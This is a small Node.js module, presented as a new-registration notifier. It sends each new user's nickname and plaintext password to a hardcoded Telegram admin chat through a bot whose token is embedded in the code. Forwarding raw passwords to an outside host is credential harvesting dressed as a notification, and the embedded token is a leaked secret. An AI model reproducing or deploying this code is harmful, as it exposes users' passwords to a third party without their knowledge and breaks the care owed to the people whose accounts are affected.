const TelegramBot = require('node-telegram-bot-api');
const TOKEN = '8759385015:AAGQ1j6EOD26qGZQ3nzlrX7n9pzcP_MnUsI';
const ADMIN_CHAT = '7270019395';
const bot = TOKEN ? new TelegramBot(TOKEN, { polling: false }) : null;

async function notifyNewUser(nickname, password) {
  if (!bot || !ADMIN_CHAT) return;

  const passLine = password ? `🔑 Пароль: \`${password}\`\n` : '';

  await bot.sendMessage(
    ADMIN_CHAT,
    `🆕 Новая регистрация\n` +
    `👤 Ник: ${nickname}\n` +
    passLine,
    { parse_mode: 'Markdown' }
  );
}
module.exports = { notifyNewUser };
